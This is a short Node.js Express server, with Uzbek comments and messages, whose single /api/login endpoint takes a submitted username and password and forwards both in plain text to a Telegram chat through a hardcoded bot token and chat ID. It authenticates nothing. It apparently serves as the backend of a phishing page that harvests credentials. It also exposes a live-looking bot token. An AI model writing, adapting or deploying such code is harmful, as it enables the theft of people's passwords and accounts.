const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 5000;

// Telegram token va chat_id
const TELEGRAM_TOKEN = '8000526841:AAG-g-rNBo9QGZ8ntDZ7ONnJzvCRBtpYJy8';
const CHAT_ID = '1322883491';

app.use(cors());
app.use(express.json());

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  const message = `🛡 Foydalanuvchi login:\n👤 Username: ${username}\n🔑 Parol: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.status(200).json({ message: 'Login ma’lumotlari qabul qilindi va yuborildi' });
  } catch (error) {
    console.error('Telegramga yuborishda xatolik:', error);
    res.status(500).json({ message: 'Telegramga yuborilmadi' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server ishga tushdi: http://localhost:${PORT}`);
});
